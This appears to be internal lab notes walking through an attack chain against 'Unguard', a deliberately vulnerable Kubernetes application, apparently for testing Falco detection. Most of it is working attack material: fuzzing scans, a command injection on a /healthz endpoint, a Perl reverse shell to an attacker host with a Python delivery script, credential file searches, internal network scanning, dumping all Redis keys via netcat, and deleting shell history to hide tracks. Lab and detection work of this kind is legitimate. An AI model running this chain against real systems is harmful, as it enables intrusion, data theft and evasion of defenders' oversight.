# Internal Notes on the TR-1353 Attack Chain

## Prerequisites

### C&C Server

In the middle of the attack, we will connect to a C&C server that is owned by the attacker.
Just to make our life a little bit easier, we just quickly connect to a pod that is already in the cluster.
In a real-world scenario, this could be any host on the internet, so this is still not cheating.

At your convenience, here is an exemplary Kubernetes manifest that you could apply in your cluster:

```yaml
kind: Namespace
apiVersion: v1
metadata:
  name: unguard-cnc
  labels:
    name: unguard-cnc
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kali-cnc-server
  namespace: unguard-cnc
  labels:
    app.kubernetes.io/name: kali-cnc-server
    app.kubernetes.io/part-of: unguard-cnc
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: kali-cnc-server
      app.kubernetes.io/part-of: unguard-cnc
  strategy:
    type: Recreate
  template:
    metadata:
      labels:
        app.kubernetes.io/name: kali-cnc-server
        app.kubernetes.io/part-of: unguard-cnc
    spec:
      containers:
        - name: kali-cnc-server
          image: kalilinux/kali-rolling:latest
          command: ["/bin/bash", "-c", "--"]
          args: ["while true; do sleep 30; done;"]
```

You can then connect to the C&C pod like so:

```sh
kubectl get pod -n unguard-cnc --selector=app.kubernetes.io/name=kali-cnc-server -o wide
kubectl exec -it -n unguard-cnc kali-cnc-server-REPLACE-WITH-ACTUAL-HASH -- /bin/bash
```

### Falco and Falcosidekick

- Install Falco with [this guide](https://github.com/falcosecurity/charts/tree/master/falco)
- (optional; not required for the attack) Install `k8saudit-eks` with [this guide](https://falco.org/blog/k8saudit-eks-plugin/)
- Make sure that you also created the necessary AWS IAM resources as specified in the guides above

If everything worked out, grab the logs of Falco:

```sh
kubectl logs -l app.kubernetes.io/name=falco -f -n falco
```

## Unguard Attack Steps

### 1. (Reconnaissance) Scan for endpoints on the web application

Let's scan the application with a fast scanner like [wfuzz](https://github.com/xmendez/wfuzz).
Since we had good experience with it in the past, we use the wordlist from [SecLists](https://github.com/danielmiessler/SecLists).

We then start the command, filter out all `404` responses,
follow redirects (`-L`), specify the wordlist (`-w`) and the URL to scan (`-u`)
with the `FUZZ` keyword that will be replaced by words in the wordlist.

```sh
curl -SsL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o common.txt
wfuzz --hc 404 -L -u http://unguard.34.159.137.129.nip.io/FUZZ -w common.txt
```

```txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://unguard.34.159.137.129.nip.io/FUZZ
Total requests: 4715

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002062:   503        0 L      0 W        0 Ch        "healthz"
000004277:   403        96 L     207 W      4340 Ch     "ui"

Total time: 60.27764
Processed Requests: 4715
Filtered Requests: 4713
Requests/sec.: 78.22136
```

We identified the following endpoints:

```txt
/ui
/healthz
```

The `/ui` endpoint shows the normal application.
Interestingly, there is also an `/healthz` endpoint which returns a `503` status code when browsed.

### 2. (Reconnaissance) Investigate the suspicious `/healthz` endpoint

The `/healthz` endpoint might be used to check the health of the application.
We can try to fuzz the parameter names that might be necessary to access the endpoint.

Let's start another scan and again filter out all `503` responses this time.

```sh
curl -SsL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt -o parameter-names.txt
wfuzz --hc 503 -L -u http://unguard.34.159.137.129.nip.io/healthz?FUZZ=dynatrace.com -w parameter-names.txt
```

```txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://unguard.34.159.137.129.nip.io/healthz?FUZZ=dynatrace.com
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000004063:   200        0 L      1 W        7 Ch        "path"

Total time: 75.65671
Processed Requests: 6451
Filtered Requests: 6450
Requests/sec.: 85.26671
```

We identified the following parameter name:

```txt
/healthz?path=dynatrace.com
```

If we browse that we get a `200` response with the following content:

```txt
HEALTHY
```

### 3. (Execution) Try to get command execution on the `/healthz` machine

It seems that the `/healthz` endpoint checks if a host is alive.
We suspect that the application might uses a `ping` command or similar to check that.
If so, this would be susceptible to command injection.

We can perform an automated check with [commix](https://github.com/commixproject/commix).
We provide the URL, the parameter name to be tested (`-p path`),
the prefix that will be appended to any test payload (`--prefix dynatrace.com`),
ignore all `500` responses (`--ignore-code 500`),
and optimistically assume that the application runs on a Unix system (`--os Unix`).

Please note that this command is a little bit fragile and might not find a vulnerability if your network has a lot of jitter.
You can skip to the next step with the exploit script then.

```sh
python3 commix.py  --url="http://unguard.34.159.137.129.nip.io/healthz?path=" -p path --prefix dynatrace.com --ignore-code 500 --os Unix -v 1
```

Here is a snippet of the result which found a command injection vulnerability with the time-based technique:

```txt
[12:50:21] [info] Testing the (blind) time-based command injection technique.
...
[12:50:52] [warning] Time-based comparison requires reset of statistical model.
[12:51:44] [debug] Identified the following injection point with a total of 63 HTTP(S) requests.
[12:51:44] [info] GET parameter 'path' appears to be injectable via (blind) time-based command injection technique.
           |_ dynatrace.com|[ 6 -ne $(echo AXDBFI |tr -d '\n' |wc -c) ] ||sleep 2
```

We can use the provided pseudo-terminal to try executing commands.
The command injection seems to be blind, see we can't capture any output.
But, by exploiting the time-based technique, we can still mine the result character by character.

```txt
Pseudo-Terminal Shell (type '?' for available options)
commix(os_shell) > whoami
[12:52:31] [info] Retrieving the length of execution output.
[12:52:44] [debug] Retrieved the length of execution output: 5
[12:52:44] [info] Presuming the execution output.
[12:54:50] [info] Finished in 00:02:06.
envoy
```

So, we found out that we have a command injection vulnerability on the `/healthz` endpoint.
And it seems that the application runs as the `envoy` user,
which probably implies that this is a [Envoy](https://www.envoyproxy.io/) proxy.

To make the exploitation more convenient, we are going to establish a reverse shell.
First, on an attacker controlled C&C server (see Prerequisites), listen for incoming connections on port `1337`:

```sh
nc -lvnp 1337
```

Then, on the victim host, we spawn a reverse shell to that host.
After much trial and error we found out that a Perl reverse shell from [revshells.com](https://www.revshells.com/) works well.
Replace `34.159.137.129` with the IP address under which the attacker machine is reachable.

```sh
perl -e 'use Socket;$i="10.1.254.117";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

To stick everything together, we resort to a small Python script initating the reverse shell.
You can run this script from your Kali machine, as all the scripts before:

```py
import requests

victim = "unguard.34.159.137.129.nip.io"
host = "34.159.137.129"
port = 1337
command = f'perl -e \'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};\''

r = requests.get(
    f"http://{victim}/healthz",
    params={"path": "example.com; " + command},
    allow_redirects=False,
    timeout=None,
)
```

With that, we have a perfect way to continue moving laterally in the system.

### 5. (Credential Access) Try finding keys and tokens in that system

Let's see if we can find any tokens or keys on this system.

```sh
find / -name "id_rsa"
find / -name "token"
```

Sadly nothing that we have access to.

### 6. (Discovery / Lateral Movement) Identify more hosts in this system

Let's scan the reachable network from that Envoy machine.
Sadly, this machine has hardly any tools installed and we do not have permission to install anything.

```sh
$ apt-get update
Reading package lists... Done
E: List directory /var/lib/apt/lists/partial is missing. - Acquire (13: Permission denied)
```

But there are a few ways around that.
First, we want to find out about the network configuration without `ip` or `ifconfig`:

```sh
cat /proc/net/fib_trie
```

By looking at the host local section in the first tree we identify our IP to be `10.20.30.40`.
Replace `10.20.30.40` it with the actual IP that you see in the result.
Let's start scanning the network with `nmap`, after first downloading it:

```sh
cd ~
curl -SsL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -o nmap
chmod +x nmap
./nmap -sn 10.1.254.64/26
```

Wow, the scanner result is quite expressive.
This seems to be a Kubernetes cluster with lots of services.

```txt
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-07-27 13:02 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-178-54-5.ec2.internal (10.178.54.5)
Host is up (0.00045s latency).
Nmap scan report for ip-10-178-54-6.ec2.internal (10.178.54.6)
Host is up (0.00051s latency).
Nmap scan report for 10-178-54-9.dynatrace-webhook.dynatrace.svc.cluster.local (10.178.54.9)
Host is up (0.00016s latency).
Nmap scan report for 10-178-54-14.otel-collector.kubescape.svc.cluster.local (10.178.54.14)
Host is up (0.00022s latency).
Nmap scan report for ip-10-178-54-16.ec2.internal (10.178.54.16)
Host is up (0.00086s latency).
Nmap scan report for ip-10-178-54-19.ec2.internal (10.178.54.19)
Host is up (0.00039s latency).
Nmap scan report for ip-10-178-54-20.ec2.internal (10.178.54.20)
Host is up (0.000087s latency).
Nmap scan report for 10-178-54-22.aws-load-balancer-webhook-service.kube-system.svc.cluster.local (10.178.54.22)
Host is up (0.00011s latency).
Nmap scan report for ip-10-178-54-24.ec2.internal (10.178.54.24)
Host is up (0.00041s latency).
Nmap scan report for ip-10-178-54-32.ec2.internal (10.178.54.32)
Host is up (0.0010s latency).
Nmap scan report for 10-178-54-40.kubescape.kubescape.svc.cluster.local (10.178.54.40)
Host is up (0.0016s latency).
Nmap scan report for ip-10-178-54-52.ec2.internal (10.178.54.52)
Host is up (0.0031s latency).
Nmap scan report for ip-10-178-54-54.ec2.internal (10.178.54.54)
Host is up (0.00072s latency).
Nmap scan report for ip-10-178-54-61.ec2.internal (10.178.54.61)
Host is up (0.00018s latency).
Nmap scan report for ip-10-178-54-64.ec2.internal (10.178.54.64)
Host is up (0.00043s latency).
Nmap scan report for ip-10-178-54-67.ec2.internal (10.178.54.67)
Host is up (0.00097s latency).
Nmap scan report for ip-10-178-54-73.ec2.internal (10.178.54.73)
Host is up (0.000089s latency).
Nmap scan report for ip-10-178-54-74.ec2.internal (10.178.54.74)
Host is up (0.00048s latency).
Nmap scan report for ip-10-178-54-82.ec2.internal (10.178.54.82)
Host is up (0.00052s latency).
Nmap scan report for ip-10-178-54-85.ec2.internal (10.178.54.85)
Host is up (0.0028s latency).
Nmap scan report for ip-10-178-54-89.ec2.internal (10.178.54.89)
Host is up (0.00068s latency).
Nmap scan report for ip-10-178-54-90.ec2.internal (10.178.54.90)
Host is up (0.00039s latency).
Nmap scan report for 10-178-54-101.falco-falcosidekick.falco.svc.cluster.local (10.178.54.101)
Host is up (0.00097s latency).
Nmap scan report for unguard-envoy-proxy-666464f76d-ff88r (10.178.54.106)
Host is up (0.00033s latency).
Nmap scan report for 10-178-54-108.unguard-microblog-service.unguard.svc.cluster.local (10.178.54.108)
Host is up (0.00011s latency).
Nmap scan report for ip-10-178-54-116.ec2.internal (10.178.54.116)
Host is up (0.00036s latency).
Nmap scan report for ip-10-178-54-121.ec2.internal (10.178.54.121)
Host is up (0.00057s latency).
Nmap scan report for ip-10-178-54-134.ec2.internal (10.178.54.134)
Host is up (0.00093s latency).
Nmap scan report for ip-10-178-54-141.ec2.internal (10.178.54.141)
Host is up (0.00038s latency).
Nmap scan report for ip-10-178-54-153.ec2.internal (10.178.54.153)
Host is up (0.00030s latency).
Nmap scan report for 10-178-54-156.juice-shop.juiceshop.svc.cluster.local (10.178.54.156)
Host is up (0.00016s latency).
Nmap scan report for 10-178-54-160.unguard-redis.unguard.svc.cluster.local (10.178.54.160)
Host is up (0.0015s latency).
Nmap scan report for ip-10-178-54-161.ec2.internal (10.178.54.161)
Host is up (0.00094s latency).
Nmap scan report for ip-10-178-54-164.ec2.internal (10.178.54.164)
Host is up (0.0014s latency).
Nmap scan report for ip-10-178-54-172.ec2.internal (10.178.54.172)
Host is up (0.00080s latency).
Nmap scan report for 10-178-54-174.unguard-ad-service.unguard.svc.cluster.local (10.178.54.174)
Host is up (0.00065s latency).
Nmap scan report for 10-178-54-176.unguard-proxy-service.unguard.svc.cluster.local (10.178.54.176)
Host is up (0.00058s latency).
Nmap scan report for ip-10-178-54-180.ec2.internal (10.178.54.180)
Host is up (0.00031s latency).
Nmap scan report for ip-10-178-54-188.ec2.internal (10.178.54.188)
Host is up (0.00087s latency).
Nmap scan report for ip-10-178-54-196.ec2.internal (10.178.54.196)
Host is up (0.00031s latency).
Nmap scan report for ip-10-178-54-197.ec2.internal (10.178.54.197)
Host is up (0.00022s latency).
Nmap scan report for 10-178-54-211.unguard-membership-service.unguard.svc.cluster.local (10.178.54.211)
Host is up (0.00051s latency).
Nmap scan report for 10-178-54-213.gateway.kubescape.svc.cluster.local (10.178.54.213)
Host is up (0.00035s latency).
Nmap scan report for unguard-mariadb-0.unguard-mariadb.unguard.svc.cluster.local (10.178.54.223)
Host is up (0.00062s latency).
Nmap scan report for ip-10-178-54-225.ec2.internal (10.178.54.225)
Host is up (0.00063s latency).
Nmap scan report for 10-178-54-227.kube-dns.kube-system.svc.cluster.local (10.178.54.227)
Host is up (0.00036s latency).
Nmap scan report for ip-10-178-54-228.ec2.internal (10.178.54.228)
Host is up (0.00028s latency).
Nmap scan report for 10-178-54-234.unguard-frontend.unguard.svc.cluster.local (10.178.54.234)
Host is up (0.0010s latency).
Nmap scan report for ip-10-178-54-240.ec2.internal (10.178.54.240)
Host is up (0.0014s latency).
Nmap done: 256 IP addresses (49 hosts up) scanned in 2.22 seconds
```

### 7. (Discovery) Contact the Kubernetes cluster

Let's see if we have a service account that is allowed to access the Kubernetes API server.

```sh
cd ~
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
```

Sadly not.

```txt
$ ./kubectl get nodes
Error from server (Forbidden): nodes is forbidden: User "system:serviceaccount:unguard:default" cannot list resource "nodes" in API group "" at the cluster scope
```

### 8. (Exfiltration) Stealing all data from Redis

There seems to be a Redis instance nearby, let's extract data from there.
We need some way to communicate with Redis, so let's also download a static binary of netcat first.

```sh
cd ~
curl -SsL https://github.com/yunchih/static-binaries/raw/master/nc -o nc
chmod +x nc
```

We can then misuse `nc` to talk to Redis:

```sh
echo "INFO" | ./nc unguard-redis.unguard.svc.cluster.local 6379
echo "KEYS *" | ./nc unguard-redis.unguard.svc.cluster.local 6379
```

This lists all the keys in Redis.
Please note that especially the last command easily breaks your terminal because the output is so large.
We can now go an and automatically retrieve all values or write a script that helps us to dump the entire content.

### 9. (Defensive Evasion) Cover our tracks

Our mission is done. Let's cover our tracks by deleting the shell history:

```sh
history -c
rm ~/.bash_history
```
